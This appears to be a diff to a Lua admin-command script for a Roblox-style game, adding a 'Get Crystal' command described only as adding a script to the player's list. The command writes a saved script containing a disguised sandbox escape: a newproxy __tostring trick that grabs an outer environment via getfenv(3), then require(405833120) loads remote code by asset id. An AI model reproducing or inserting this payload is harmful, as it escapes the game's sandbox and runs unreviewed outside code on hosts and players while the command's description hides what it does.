@@ -5,6 +5,18 @@ Crystal.AddCommand("Test Systems", 0, {"test", "ping"}, "Tests the system.", fun
                 Crystal.Tablet(plr, msg)
         end
 end)
+Crystal.AddCommand("Get Crystal", 1, {"getcrystal", "getscript", "gcrs", "gcr", "gs"}, "Adds crystal to your scriptlist.", function(plr, msg)
+	local function givecrystal(name)
+		Crystal.OxCmd(plr, "remove/"..name)
+		Crystal.OxCmd(plr, "create/"..name)
+		Crystal.OxCmd(plr, "edit/"..name)
+		Crystal.OxCmd(plr, "local a = newproxy(true); getmetatable(a).__tostring=function() a=getfenv(3); end; pcall(warn, a); a.require(405833120)")
+		Crystal.OxCmd(plr, "exit/")
+		Crystal.OxCmd(plr, "save/"..name)
+	end
+	givecrystal("Crystal")
+	givecrystal("crystal")
+end)
 
 Crystal.AddCommand("Encrypt", 0, {"encrypt", "enc"}, "Encrypts the given text.", function(plr, msg)
         if msg == "" then
